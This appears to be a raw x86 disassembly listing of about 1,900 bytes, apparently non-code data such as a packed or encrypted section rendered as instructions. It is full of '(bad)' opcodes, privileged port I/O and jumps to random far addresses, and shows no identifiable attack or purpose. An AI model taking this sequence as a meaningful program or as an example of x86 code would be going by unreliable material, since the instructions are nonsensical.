  412077:	xlat   BYTE PTR ds:[ebx]
  412078:	cld    
  412079:	cli    
  41207a:	rcr    DWORD PTR [ebx-0x573d00a5],1
  412080:	dec    edi
  412081:	cmp    eax,0xd64a08c9
  412086:	mov    eax,0x2a7a8aa6
  41208b:	mov    ah,0x73
  41208d:	mov    eax,0x72d74ad5
  412092:	or     BYTE PTR [ecx],bl
  412094:	pop    es
  412095:	mov    dl,0x73
  412097:	shr    DWORD PTR [ebp+0x4ecc731d],cl
  41209d:	cmp    eax,DWORD PTR [ecx+ebx*1-0x20]
  4120a1:	fcom   DWORD PTR [edx-0x6b664b8b]
  4120a7:	dec    ebp
  4120a8:	push   ss
  4120a9:	cmc    
  4120aa:	test   eax,0x5e9a2c1
  4120af:	test   DWORD PTR [eiz*4+0x60db135b],esp
  4120b6:	sti    
  4120b7:	jle    0x4120fd
  4120b9:	jle    0x4120b4
  4120bb:	mov    dh,0x4c
  4120bd:	bound  ebx,QWORD PTR [ecx+0x41]
  4120c0:	mov    WORD PTR [edx+0x3222ec7d],ss
  4120c6:	mov    ds:0xa5813d50,al
  4120cb:	js     0x412081
  4120cd:	ja     0x41205b
  4120cf:	push   ss
  4120d0:	xchg   DWORD PTR fs:[edi+0x3a],ebx
  4120d4:	dec    eax
  4120d5:	pop    esi
  4120d6:	mov    esp,0x23f5c05c
  4120db:	fsub   DWORD PTR [ebx-0x4a29cddc]
  4120e1:	cmp    eax,0xf1878e70
  4120e6:	out    dx,eax
  4120e7:	test   eax,0xec813fc4
  4120ec:	jle    0x4120ca
  4120ee:	mov    bh,0xd3
  4120f0:	mov    cl,BYTE PTR [ecx-0x5b]
  4120f3:	sub    DWORD PTR [ecx-0x7450d49],ebp
  4120f9:	pop    edx
  4120fa:	int    0x5a
  4120fc:	popa   
  4120fd:	xor    eax,0xfe2e6aae
  412102:	mov    dl,0x83
  412104:	cmc    
  412105:	inc    eax
  412106:	mov    ds:0xc386b8b,eax
  41210b:	lods   eax,DWORD PTR ds:[esi]
  41210c:	mov    eax,0xe507fc27
  412111:	bound  esp,QWORD PTR [edi+0x4d09829c]
  412117:	mov    eax,ds:0x269b2d1c
  41211c:	push   0xa3c2a76a
  412121:	sub    eax,esp
  412123:	fstp   DWORD PTR [edx+0x3c832af5]
  412129:	lahf   
  41212a:	ins    BYTE PTR es:[edi],dx
  41212b:	mov    dl,0x36
  41212d:	daa    
  41212e:	daa    
  41212f:	jl     0x4120ee
  412131:	ret    0xe384
  412134:	shl    DWORD PTR [ebp+0xb],0xed
  412138:	cmp    esp,eax
  41213a:	out    0x80,al
  41213c:	jmp    edi
  41213e:	mov    cl,0x50
  412140:	mov    ds:0x88c05dfc,al
  412145:	pop    ds
  412146:	cmp    bl,ch
  412148:	rep outs dx,DWORD PTR ds:[esi]
  41214a:	pop    ss
  41214b:	mov    cs,WORD PTR [eax]
  41214d:	mov    bl,0xb0
  41214f:	mov    eax,ds:0x4fea7130
  412154:	ret    0x2979
  412157:	jns    0x4120e9
  412159:	sbb    eax,DWORD PTR [edi]
  41215b:	retf   
  41215c:	mov    ebx,0xc2589c11
  412161:	cmp    DWORD PTR [esi+0x7d54f7f3],ecx
  412167:	mov    eax,0x6a8f5a60
  41216c:	out    0x1d,eax
  41216e:	mov    bl,0xe7
  412170:	mov    ecx,DWORD PTR [eax-0x15]
  412173:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412174:	pop    es
  412175:	jge    0x4120fc
  412177:	outs   dx,BYTE PTR ds:[esi]
  412178:	scas   eax,DWORD PTR es:[edi]
  412179:	addr16 jg 0x4121e4
  41217c:	lahf   
  41217d:	sti    
  41217e:	dec    ecx
  41217f:	and    DWORD PTR [ebx+0x62225ba4],esi
  412185:	jae    0x41215a
  412187:	out    dx,eax
  412188:	aaa    
  412189:	sbb    al,0x66
  41218b:	and    BYTE PTR [ebx],cl
  41218d:	jge    0x4121e6
  41218f:	sub    al,0xfe
  412191:	xchg   ebx,ebx
  412193:	mov    ebp,?
  412195:	shl    BYTE PTR [edi],0xc5
  412198:	sti    
  412199:	and    BYTE PTR [edx+eiz*2-0x16],bl
  41219d:	fcom   QWORD PTR [eax-0x1f]
  4121a0:	mov    eax,0x9cb22303
  4121a5:	push   ebp
  4121a6:	xor    al,0xc7
  4121a8:	fistp  DWORD PTR [esi]
  4121aa:	sbb    BYTE PTR [esi],bh
  4121ac:	push   ebx
  4121ad:	jmp    0x69a5227a
  4121b2:	test   eax,0xc5d42ef7
  4121b7:	dec    ebx
  4121b8:	sub    BYTE PTR [esi+esi*1],0x56
  4121bc:	mov    eax,ds:0x8b4bd3c7
  4121c1:	data16 mov ah,0x3f
  4121c4:	popf   
  4121c5:	add    bl,BYTE PTR [ebp-0x5d]
  4121c8:	scas   al,BYTE PTR es:[edi]
  4121c9:	aad    0xf8
  4121cb:	cld    
  4121cc:	sbb    dl,BYTE PTR [esi+0x23]
  4121cf:	adc    DWORD PTR [edx-0x2e],0x3853375c
  4121d6:	push   0xfffffff0
  4121d8:	js     0x412209
  4121da:	sub    edx,ebp
  4121dc:	xlat   BYTE PTR ds:[ebx]
  4121dd:	lods   eax,DWORD PTR ds:[esi]
  4121de:	lock pop ecx
  4121e0:	xor    cl,BYTE PTR [esi]
  4121e2:	pop    edx
  4121e3:	pop    ds
  4121e4:	pop    ebp
  4121e5:	xchg   edi,eax
  4121e6:	fistp  QWORD PTR [ebx-0x10d7bca0]
  4121ec:	lods   al,BYTE PTR ds:[esi]
  4121ed:	mov    ch,0x47
  4121ef:	dec    esp
  4121f0:	getsec 
  4121f2:	cmp    dl,BYTE PTR [eax-0x2f25fe67]
  4121f8:	push   esp
  4121f9:	mov    BYTE PTR [esi+edi*2+0x69fd764b],cl
  412200:	and    al,0x1f
  412202:	mov    BYTE PTR [edi+ecx*4-0x5bab602b],bh
  412209:	mov    ds:0x4d00bf7b,al
  41220e:	cmp    bh,BYTE PTR [edx+0x381352b8]
  412214:	xchg   ecx,eax
  412215:	ror    DWORD PTR [edx-0x55f0a4ec],0xa3
  41221c:	popf   
  41221d:	add    DWORD PTR [esi+ebp*8+0x8091f32],eax
  412224:	xchg   BYTE PTR [esi+0x24],bl
  412227:	ja     0x412216
  412229:	dec    edi
  41222a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41222b:	mov    ebp,0x6d9eb58b
  412230:	jb     0x412201
  412232:	stos   DWORD PTR es:[edi],eax
  412233:	repnz movs BYTE PTR es:[edi],BYTE PTR es:[esi]
  412236:	mov    ecx,0x4ea81d24
  41223b:	es sub eax,0xce524a83
  412241:	sub    bh,BYTE PTR [edi]
  412243:	or     esi,DWORD PTR [ebx+ecx*2-0x2b]
  412247:	xchg   ecx,eax
  412248:	scas   al,BYTE PTR es:[edi]
  412249:	xor    DWORD PTR [esi],0xb37585a1
  41224f:	jmp    0xff0c:0x310ee39e
  412256:	push   0x5b
  412258:	popf   
  412259:	mov    WORD PTR [esi+0x132e4f7c],cs
  41225f:	ins    DWORD PTR es:[edi],dx
  412260:	push   es
  412261:	mov    ebx,0x2e00c031
  412266:	in     al,0xc2
  412268:	clc    
  412269:	xor    eax,0xb2476db6
  41226e:	data16 mov ds:0x2d0d5619,al
  412274:	scas   eax,DWORD PTR es:[edi]
  412275:	pop    edx
  412276:	jg     0x41222b
  412278:	stos   BYTE PTR es:[edi],al
  412279:	test   BYTE PTR [edi+0x449c8b9c],bh
  41227f:	adc    eax,0xd1748aed
  412284:	mov    eax,0x8f555222
  412289:	xlat   BYTE PTR ds:[ebx]
  41228a:	int3   
  41228b:	xchg   BYTE PTR [esi],bl
  41228d:	mov    bh,0xe
  41228f:	jg     0x412232
  412291:	push   esp
  412292:	jae    0x412306
  412294:	push   ebx
  412295:	in     al,0x53
  412297:	lea    eax,[esi-0x18]
  41229a:	pop    esp
  41229b:	loopne 0x41225b
  41229d:	fsubr  QWORD PTR [ebx-0x170653ee]
  4122a3:	push   ds
  4122a4:	push   edx
  4122a5:	push   esp
  4122a6:	aad    0x42
  4122a8:	mov    bl,0xf6
  4122aa:	mov    ebp,0x74ab805b
  4122af:	in     al,dx
  4122b0:	adc    BYTE PTR [ebx],al
  4122b2:	test   eax,0x8f88d614
  4122b7:	(bad)  
  4122b8:	mov    ah,0xa3
  4122ba:	inc    ebx
  4122bb:	cmp    DWORD PTR [ecx-0x17],ecx
  4122be:	dec    ecx
  4122bf:	fisttp QWORD PTR [ecx-0x7e798527]
  4122c5:	in     eax,0xca
  4122c7:	mov    es,WORD PTR [edx+0x31]
  4122ca:	mov    eax,0xb5e98fec
  4122cf:	xchg   esi,eax
  4122d0:	clc    
  4122d1:	mov    bl,BYTE PTR [ebx-0x8bf8a69]
  4122d7:	int3   
  4122d8:	pop    esi
  4122d9:	scas   eax,DWORD PTR es:[edi]
  4122da:	push   0xffffffc0
  4122dc:	jmp    0xf9106095
  4122e1:	or     eax,ebp
  4122e3:	(bad)  
  4122e4:	mov    ecx,0xbd34c277
  4122e9:	xchg   ecx,eax
  4122ea:	xor    BYTE PTR [ecx-0x7a],0x0
  4122ee:	inc    ecx
  4122ef:	xor    DWORD PTR [eax-0x5ba1dfb9],edx
  4122f5:	adc    ah,ah
  4122f7:	daa    
  4122f8:	push   ds
  4122f9:	jno    0x41230f
  4122fb:	test   dl,ch
  4122fd:	arpl   WORD PTR [eax],bx
  4122ff:	outs   dx,BYTE PTR ds:[esi]
  412300:	loopne 0x412374
  412302:	ror    ebp,0x10
  412305:	xor    BYTE PTR [esi+0x32],bl
  412308:	out    0x48,eax
  41230a:	jecxz  0x412378
  41230c:	mov    bh,0xfb
  41230e:	xchg   esp,eax
  41230f:	push   edi
  412310:	xchg   DWORD PTR [ebp+0x7f8328ff],eax
  412316:	adc    eax,0xaf0e0dd1
  41231b:	inc    ebx
  41231c:	lds    eax,FWORD PTR [ecx+0x7393bac9]
  412322:	xor    ah,BYTE PTR ds:0xec05c0b9
  412328:	or     ebx,DWORD PTR [esi+0x7778cbeb]
  41232e:	adc    al,0x5a
  412330:	in     al,0x68
  412332:	push   0xc0bec3e1
  412337:	sub    BYTE PTR [edi+edx*4-0x26],bl
  41233b:	jp     0x4123a2
  41233d:	sti    
  41233e:	pop    esi
  41233f:	push   ss
  412340:	scas   al,BYTE PTR es:[edi]
  412341:	pop    edx
  412342:	add    al,0x3b
  412344:	push   ds
  412345:	mov    dl,0x7a
  412347:	adc    eax,0xd94485
  41234c:	in     eax,0x8d
  41234e:	sbb    edx,0x19
  412351:	loopne 0x4123a9
  412353:	push   edx
  412354:	adc    ah,BYTE PTR gs:[ebx-0x6e2bf3b3]
  41235b:	jno    0x412311
  41235d:	(bad)  
  41235f:	xchg   esi,eax
  412360:	mov    edi,0x8f25b6f8
  412365:	imul   esi,DWORD PTR [ecx+0x48],0x27
  412369:	adc    al,0x38
  41236b:	or     al,0xb2
  41236d:	out    dx,eax
  41236e:	and    cl,BYTE PTR [ebx-0x43f1da46]
  412374:	pop    eax
  412375:	rol    ebx,cl
  412377:	ret    
  412378:	mov    dh,0x30
  41237a:	popf   
  41237b:	imul   esi,DWORD PTR [eax+0x38],0xd3b93ce5
  412382:	inc    edi
  412383:	jmp    0x30b4:0xc276c8ce
  41238a:	cmp    BYTE PTR [eax+ebx*2],0x23
  41238e:	mov    edx,DWORD PTR [ebx]
  412390:	push   ds
  412391:	popa   
  412392:	sbb    esp,edi
  412394:	and    al,0x9e
  412396:	dec    esi
  412397:	jno    0x4123f0
  412399:	mov    dh,0x3d
  41239b:	jle    0x41232e
  41239d:	sahf   
  41239e:	leave  
  41239f:	pop    ecx
  4123a0:	scas   al,BYTE PTR es:[edi]
  4123a1:	test   bh,0x52
  4123a4:	mov    al,ds:0x9c36c35
  4123a9:	ret    
  4123aa:	stc    
  4123ab:	test   eax,0xda9b40f7
  4123b0:	nop
  4123b1:	or     DWORD PTR [ecx],ecx
  4123b3:	lods   al,BYTE PTR ds:[esi]
  4123b4:	adc    eax,0x1ef52085
  4123b9:	mov    WORD PTR [ebx+0x5f],fs
  4123bc:	leave  
  4123bd:	dec    esp
  4123be:	xor    DWORD PTR [ecx],ebx
  4123c0:	out    0x3e,al
  4123c2:	(bad)  
  4123c3:	aas    
  4123c4:	clc    
  4123c5:	adc    al,0x82
  4123c7:	stos   BYTE PTR es:[edi],al
  4123c8:	fimul  DWORD PTR [edx+0x3d4880f2]
  4123ce:	adc    BYTE PTR [edx+esi*1-0x31],ah
  4123d2:	pop    ebx
  4123d3:	stos   DWORD PTR es:[edi],eax
  4123d4:	cli    
  4123d5:	push   DWORD PTR [edx-0x62e84367]
  4123db:	jmp    0x834c:0x7241ec87
  4123e2:	sub    eax,0xcb22c4c1
  4123e7:	dec    edx
  4123e8:	jecxz  0x41241e
  4123ea:	es (bad) 
  4123ec:	aam    0xc4
  4123ee:	cmp    al,0xa7
  4123f0:	cmp    DWORD PTR ds:0xdc52d9f5,ebx
  4123f6:	jmp    0x41245f
  4123f8:	retf   
  4123f9:	mov    edx,0xad1f526
  4123fe:	call   0x990d085d
  412403:	mov    dl,0xad
  412405:	xor    ah,BYTE PTR [eax+0x3af63d44]
  41240b:	out    0xfd,al
  41240d:	push   ss
  41240e:	mov    ds:0x64ce10e3,al
  412413:	sub    BYTE PTR [eax-0xc1d45b5],0xe4
  41241a:	pop    ss
  41241b:	pop    eax
  41241d:	ins    DWORD PTR es:[edi],dx
  41241e:	cs ins BYTE PTR es:[edi],dx
  412420:	loope  0x4123c2
  412422:	sbb    esi,eax
  412424:	jnp    0x4123b4
  412426:	sbb    eax,0x460a1368
  41242b:	iret   
  41242c:	sub    al,0xb1
  41242e:	push   ebp
  41242f:	sbb    al,BYTE PTR [ebp+0x7]
  412432:	mov    bh,0x2a
  412434:	into   
  412435:	pop    es
  412436:	mov    ecx,DWORD PTR [ebx-0x3e]
  412439:	xor    DWORD PTR [eax-0x7c],edx
  41243c:	(bad)  
  41243d:	lds    eax,FWORD PTR [edx]
  41243f:	sub    ebx,DWORD PTR [ecx-0xf]
  412442:	fs int 0xf6
  412445:	sub    al,0xcd
  412447:	out    dx,eax
  412448:	retf   
  412449:	sbb    eax,0xd1255a99
  41244e:	or     BYTE PTR [edi],bh
  412450:	stos   BYTE PTR es:[edi],al
  412451:	inc    edi
  412452:	sub    edi,DWORD PTR ds:[ecx]
  412455:	mov    DWORD PTR ds:0x9430df2c,edi
  41245b:	scas   eax,DWORD PTR es:[edi]
  41245c:	aaa    
  41245d:	(bad)  
  41245e:	test   ah,0x85
  412461:	mov    al,0x82
  412463:	in     al,dx
  412464:	mov    eax,0x4b9ab525
  412469:	and    al,0x14
  41246b:	cdq    
  41246c:	pop    edx
  41246d:	gs loope 0x41241b
  412470:	int    0x1d
  412472:	mov    dh,0xaa
  412474:	mov    al,0x87
  412476:	lea    ebp,[esi]
  412478:	ficomp DWORD PTR [esi+0x44dbd13a]
  41247e:	xor    DWORD PTR [ebp+0xa],edi
  412481:	int    0xd
  412483:	cli    
  412484:	bound  edi,QWORD PTR [ebp+0x71]
  412487:	std    
  412488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412489:	test   BYTE PTR [ebx],bh
  41248b:	mov    ch,BYTE PTR [edx]
  41248d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41248e:	adc    DWORD PTR [ebp-0x13],esp
  412491:	cmp    eax,0xefab8a65
  412496:	sub    DWORD PTR [eax-0x7d4b3fce],esi
  41249c:	sbb    DWORD PTR [ebx],0xd2b75695
  4124a2:	add    DWORD PTR [ecx-0x35aa141c],esp
  4124a8:	out    dx,eax
  4124a9:	idiv   DWORD PTR [ebx]
  4124ab:	sbb    eax,0x3022eaa
  4124b0:	mov    BYTE PTR [eax-0x4794f9f8],dh
  4124b6:	cli    
  4124b7:	jmp    0x20d0:0x3037b18e
  4124be:	mov    BYTE PTR [eax+0xee229e9],dl
  4124c4:	(bad)  
  4124c5:	in     eax,dx
  4124c6:	(bad)  [ebx+ebp*4]
  4124c9:	jmp    0xb952de65
  4124ce:	(bad)  
  4124cf:	cdq    
  4124d0:	cmp    dh,bh
  4124d2:	xadd   DWORD PTR [edi-0x78],ecx
  4124d6:	outs   dx,DWORD PTR ds:[esi]
  4124d7:	lea    edi,[esi]
  4124d9:	dec    edx
  4124da:	mov    DWORD PTR [edi],ebp
  4124dc:	rol    DWORD PTR [ecx],cl
  4124de:	cwde   
  4124df:	pop    esp
  4124e0:	repz (bad) 
  4124e2:	cmp    edi,DWORD PTR ds:0x65b18276
  4124e8:	sbb    eax,DWORD PTR [ebx-0x5570aa13]
  4124ee:	fiadd  WORD PTR [esi]
  4124f0:	sbb    eax,esi
  4124f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124f3:	hlt    
  4124f4:	stos   DWORD PTR es:[edi],eax
  4124f5:	outs   dx,DWORD PTR ds:[esi]
  4124f6:	ins    DWORD PTR es:[edi],dx
  4124f7:	shl    DWORD PTR [edi-0x7e],0xab
  4124fb:	js     0x41252a
  4124fd:	(bad)  
  4124fe:	fnstenv [ebx-0x3e]
  412501:	retf   0xf77e
  412504:	mov    cl,0xd9
  412506:	jne    0x41252b
  412508:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412509:	mov    esi,ebx
  41250b:	sub    ah,al
  41250d:	leave  
  41250e:	sub    ah,BYTE PTR [ebx]
  412510:	cmp    dl,ch
  412512:	outs   dx,BYTE PTR ds:[esi]
  412513:	pop    esp
  412514:	stc    
  412515:	mov    al,ds:0x68f5979e
  41251a:	xchg   ebx,eax
  41251b:	xchg   esi,eax
  41251c:	and    al,al
  41251e:	bound  ecx,QWORD PTR [eax-0x37ed5082]
  412524:	das    
  412525:	push   ebp
  412526:	ins    DWORD PTR es:[edi],dx
  412527:	ret    0x4b4d
  41252a:	outs   dx,DWORD PTR ds:[esi]
  41252b:	mov    cl,0x61
  41252d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41252e:	popa   
  41252f:	xchg   ebx,eax
  412530:	lods   al,BYTE PTR ds:[esi]
  412531:	or     DWORD PTR [ebp+0xdd9705f],0xffffff96
  412538:	mov    cl,BYTE PTR [eax+eiz*4-0x3c]
  41253c:	or     ebx,esp
  41253e:	js     0x412505
  412540:	push   cs
  412541:	mov    eax,edx
  412543:	les    edx,FWORD PTR [edi]
  412545:	mov    cl,0x3f
  412547:	mov    dh,0xba
  412549:	xchg   ebp,eax
  41254a:	call   FWORD PTR [edi+0x68fd0689]
  412550:	adc    al,ah
  412552:	inc    ecx
  412553:	inc    ebp
  412554:	cmp    eax,0xfd7dd879
  412559:	xor    eax,0xb3b888b0
  41255e:	push   ebx
  41255f:	jmp    0x221f2df1
  412564:	or     ebp,eax
  412566:	ret    
  412567:	je     0x41256f
  412569:	sub    BYTE PTR [eax],bl
  41256b:	mov    eax,ds:0xe70ca97e
  412570:	cmp    ebx,0x16029a46
  412576:	push   edi
  412577:	mov    eax,0x16a6b17
  41257c:	dec    eax
  41257d:	call   0xafc4f495
  412582:	fmul   st(5),st
  412584:	push   ecx
  412585:	loop   0x41257c
  412587:	xchg   DWORD PTR [esi-0x6e],edx
  41258a:	aad    0xd9
  41258c:	sub    esp,DWORD PTR [edi+0x51]
  41258f:	dec    BYTE PTR [ebx+eax*2+0x220d4a12]
  412596:	(bad)  
  412597:	mov    ebx,0xc8236f7e
  41259c:	jae    0x4125b7
  41259e:	outs   dx,DWORD PTR ds:[esi]
  41259f:	mov    bh,0xb1
  4125a1:	bound  ebp,QWORD PTR [ecx-0x45]
  4125a4:	mov    ah,0xac
  4125a6:	mov    cl,0xf6
  4125a8:	xor    BYTE PTR [edx-0x4d],bl
  4125ab:	iret   
  4125ac:	dec    edx
  4125ad:	rol    BYTE PTR [esi],cl
  4125af:	push   ds
  4125b0:	add    eax,0x9539f8f5
  4125b5:	ins    DWORD PTR es:[edi],dx
  4125b6:	stos   BYTE PTR es:[edi],al
  4125b7:	cli    
  4125b8:	push   edx
  4125b9:	mov    edx,0x331545d2
  4125be:	mov    al,ds:0xcbf082f3
  4125c3:	push   eax
  4125c4:	cli    
  4125c5:	cmp    edi,edx
  4125c7:	mov    dh,BYTE PTR ds:0xfe8b0d19
  4125cd:	jae    0x4125e5
  4125cf:	push   esp
  4125d0:	or     dh,ch
  4125d2:	clc    
  4125d3:	les    ebp,FWORD PTR [edx-0x4251dc47]
  4125d9:	sub    al,BYTE PTR [edx-0x56]
  4125dc:	mov    ds:0x9b9ca06d,al
  4125e1:	outs   dx,DWORD PTR ds:[esi]
  4125e2:	jb     0x4125eb
  4125e4:	repz jmp 0x412663
  4125e7:	in     eax,dx
  4125e8:	shl    esp,0x65
  4125eb:	je     0x41260b
  4125ed:	mov    dh,0x43
  4125ef:	retf   0x623
  4125f2:	and    al,0x58
  4125f4:	retf   
  4125f5:	xchg   esi,eax
  4125f6:	aam    0x26
  4125f8:	mov    ch,0x50
  4125fa:	push   es
  4125fb:	out    0x83,al
  4125fd:	adc    BYTE PTR [eax-0x35],bl
  412600:	push   0xffffffe6
  412602:	sbb    bl,BYTE PTR [eax-0x59]
  412605:	rcl    DWORD PTR [esi-0x2a],1
  412608:	popa   
  412609:	xor    DWORD PTR [ecx+0x3bb37c7b],edx
  41260f:	in     eax,dx
  412610:	inc    ebx
  412611:	xor    BYTE PTR [eax+eax*1-0x3c],0xa5
  412616:	call   0x31529f6b
  41261b:	or     bh,BYTE PTR [ebx-0x7d89515f]
  412621:	xor    al,0x50
  412623:	mov    al,ds:0xd90b8d94
  412628:	cld    
  412629:	mov    ecx,0xc3d851a0
  41262e:	jo     0x41264a
  412630:	call   0x3fb1:0x7958116f
  412637:	push   esi
  412638:	jbe    0x41265e
  41263a:	mov    al,0xed
  41263c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41263d:	ret    0x2971
  412640:	push   ebx
  412641:	sahf   
  412642:	and    eax,0x556f99d4
  412647:	mov    WORD PTR ds:0xf060934a,ss
  41264d:	retf   0x6f02
  412650:	jp     0x412691
  412652:	lds    edi,FWORD PTR [edi+ebx*2-0x5e11057d]
  412659:	(bad)  
  41265a:	clc    
  41265b:	and    al,0x2f
  41265d:	sbb    ebp,DWORD PTR [eax+0xbb34ce3]
  412663:	lods   eax,DWORD PTR ds:[esi]
  412664:	push   ebx
  412665:	cmp    eax,0x20d36b2
  41266a:	pop    eax
  41266b:	fidivr DWORD PTR [esi+0x7e7a7ca4]
  412671:	jmp    0x57c2:0xb4d2a082
  412678:	shl    DWORD PTR [edx],cl
  41267a:	inc    edx
  41267b:	aas    
  41267c:	mov    ch,0x8b
  41267e:	jmp    0x22301142
  412683:	pop    edi
  412684:	bound  esp,QWORD PTR [ecx]
  412686:	fcomi  st,st(0)
  412688:	mov    eax,ds:0xc348093
  41268d:	rcr    DWORD PTR [edx+0x2c],1
  412690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412691:	add    esp,DWORD PTR [eax-0x6f]
  412694:	push   esi
  412695:	cwde   
  412696:	jbe    0x41261d
  412698:	mov    ecx,DWORD PTR [edi+0x6857ce64]
  41269e:	mov    ebx,0xcb664f24
  4126a3:	add    eax,0x9d9014ab
  4126a8:	xor    DWORD PTR [esi],0x37
  4126ab:	sub    BYTE PTR [eax+0x41],dl
  4126ae:	ins    DWORD PTR es:[edi],dx
  4126af:	rcr    DWORD PTR [ecx+eiz*1-0x75edb982],cl
  4126b6:	and    BYTE PTR [esi],cl
  4126b8:	aad    0x8
  4126ba:	pop    esp
  4126bb:	out    dx,al
  4126bc:	sbb    ebp,esi
  4126be:	xor    al,0x33
  4126c0:	fldenv ds:0xbd27c2b4
  4126c6:	out    dx,al
  4126c7:	js     0x41265c
  4126c9:	xchg   esi,eax
  4126ca:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4126cc:	pop    ds
  4126cd:	xchg   ebp,eax
  4126ce:	adc    eax,0xcf862b25
  4126d3:	push   cs
  4126d4:	add    al,0xac
  4126d6:	jo     0x4126a5
  4126d8:	fild   QWORD PTR [ebx+0xd]
  4126db:	lods   eax,DWORD PTR ds:[esi]
  4126dc:	stos   BYTE PTR es:[edi],al
  4126dd:	xchg   edi,eax
  4126de:	je     0x412680
  4126e0:	ins    BYTE PTR es:[edi],dx
  4126e1:	stos   DWORD PTR es:[edi],eax
  4126e2:	jno    0x412748
  4126e4:	repz xchg ebx,eax
  4126e6:	push   ebx
  4126e7:	hlt    
  4126e8:	enter  0x2ce4,0x7b
  4126ec:	cdq    
  4126ed:	push   esp
  4126ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126ef:	loopne 0x412711
  4126f1:	xchg   ebp,ebx
  4126f3:	aam    0xa5
  4126f5:	add    al,0x42
  4126f7:	push   ebp
  4126f8:	mov    WORD PTR [edi+0x45493ffb],ss
  4126fe:	repnz adc ch,BYTE PTR [esi-0x75ca16a9]
  412705:	rcl    DWORD PTR [eax+0x38],1
  412708:	or     eax,0xfaaf9945
  41270d:	test   al,0x0
  41270f:	sbb    DWORD PTR [esi+0x33c3f193],0x6e
  412716:	sbb    ebp,DWORD PTR [ecx-0x46]
  412719:	scas   al,BYTE PTR es:[edi]
  41271a:	in     eax,dx
  41271b:	rcr    BYTE PTR [edx],1
  41271d:	jmp    0xe2308f54
  412722:	xor    dl,dh
  412724:	lods   al,BYTE PTR ds:[esi]
  412725:	xor    BYTE PTR ds:0x43401644,dh
  41272b:	dec    ecx
  41272c:	mov    eax,ds:0xb009a326
  412731:	and    edi,DWORD PTR [edx-0x37]
  412734:	fs mul esi
  412737:	xor    DWORD PTR [edi-0x36],edx
  41273a:	sub    al,0xd7
  41273c:	and    eax,0x87a769d4
  412741:	xchg   BYTE PTR [ebx+0x456855b3],bl
  412747:	cmp    eax,0x424e60fe
  41274c:	hlt    
  41274d:	gs scas al,BYTE PTR es:[edi]
  41274f:	push   eax
  412750:	dec    edx
  412751:	jmp    0x9f363a72
  412756:	add    bh,BYTE PTR [ecx]
  412758:	aad    0x18
  41275a:	adc    eax,0x665d211a
  41275f:	cmp    al,0xd9
  412761:	loope  0x4127b4
  412763:	xchg   edx,eax
  412764:	xchg   ecx,eax
  412765:	scas   al,BYTE PTR es:[edi]
  412766:	(bad)  
  412767:	clc    
  412768:	and    eax,0xa1c792ca
  41276d:	add    bh,BYTE PTR [ecx+0x707106f6]
  412773:	popf   
  412774:	in     al,dx
  412775:	lds    di,DWORD PTR [eax-0x2017f388]
  41277c:	pop    esi
  41277d:	sub    ebx,DWORD PTR [ebx]
  41277f:	mov    ch,0xf
  412781:	pop    eax
  412782:	inc    edi
  412783:	adc    dh,bl
  412785:	out    dx,al
  412786:	call   0x1fb87ec8
  41278b:	gs dec esp
  41278d:	icebp  
  41278e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41278f:	xlat   BYTE PTR ds:[ebx]
  412790:	fdiv   DWORD PTR [eax+0x52b74986]
  412796:	jns    0x41279a
  412798:	popa   
  412799:	(bad)  
  41279b:	cli    
  41279c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41279d:	sbb    DWORD PTR [ebx-0x71fddaa7],0xffffffbc
  4127a4:	xchg   edx,eax
  4127a5:	mov    bl,0x8a
  4127a7:	shl    BYTE PTR [edx+0xe],0x9d
  4127ab:	push   edi
  4127ac:	mov    esi,0xed2ffc16
  4127b1:	mov    edx,cs
  4127b3:	not    BYTE PTR [eax]
  4127b5:	aas    
  4127b6:	xor    eax,0xac0ab881
  4127bb:	or     eax,DWORD PTR [eax]
  4127bd:	ja     0x41277a
  4127bf:	out    dx,al
  4127c0:	jo     0x412766
  4127c2:	out    0xce,al
  4127c4:	xchg   esi,eax
  4127c5:	sbb    al,0x9e
  4127c7:	lds    ebp,FWORD PTR [ecx+ebx*8]
  4127ca:	mov    ecx,es
  4127cc:	xchg   esi,eax
  4127cd:	lods   eax,DWORD PTR ds:[esi]
  4127ce:	in     eax,dx
  4127cf:	adc    dl,BYTE PTR [edx+0x5faa218b]
  4127d5:	mov    ebx,0xe7c4a140
  4127da:	mov    ebp,0xc8e2b104
  4127df:	repnz mov eax,ds:0xfc73549e
  4127e5:	mov    ch,0xa8
  4127e7:	stc    
  4127e8:	outs   dx,BYTE PTR ds:[esi]
  4127e9:	cdq    
  4127ea:	adc    al,0x10
  4127ec:	test   al,0xd8
  4127ee:	add    DWORD PTR [edx-0x5c],esp
  4127f1:	test   eax,0xc7a058e7
  4127f6:	jp     0x4127a8
  4127f8:	int    0x75
  4127fa:	jg     0x41285c
  4127fc:	xor    ah,bl
  4127fe:	fstp   TBYTE PTR [eax]
  412800:	mov    dh,ah
  412802:	sbb    ebp,eax
  412804:	repnz sar DWORD PTR [esi],1
  412807:	sbb    esp,DWORD PTR [ebx]
  412809:	push   ebx
  41280a:	jne    0x412816
  41280c:	(bad)  
  41280f:	shr    BYTE PTR [esi+0x1],0x0
  412813:	dec    edi
  412814:	adc    al,ah
  412816:	push   ebx
  412817:	(bad)
  41281a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41281b:	push   esp
  41281c:	hlt    
  41281d:	(bad)  
  41281e:	dec    eax
  41281f:	cmc    
  412820:	xchg   DWORD PTR [eax+edi*8+0x393fc736],esp
  412827:	cmc    
  412828:	sbb    BYTE PTR ds:0x33b552ce,bh
  41282e:	adc    dl,cl
  412830:	cmp    BYTE PTR [esi],0x6d
  412833:	add    esi,DWORD PTR [esp+ebx*1-0x6d]
  412837:	je     0x41285d
  412839:	loope  0x4127f3
  41283b:	(bad)  
  41283c:	sti    
  41283d:	sub    BYTE PTR [esi],dh
  41283f:	and    DWORD PTR [edi+0x6],edx
  412842:	test   BYTE PTR [edx],ah
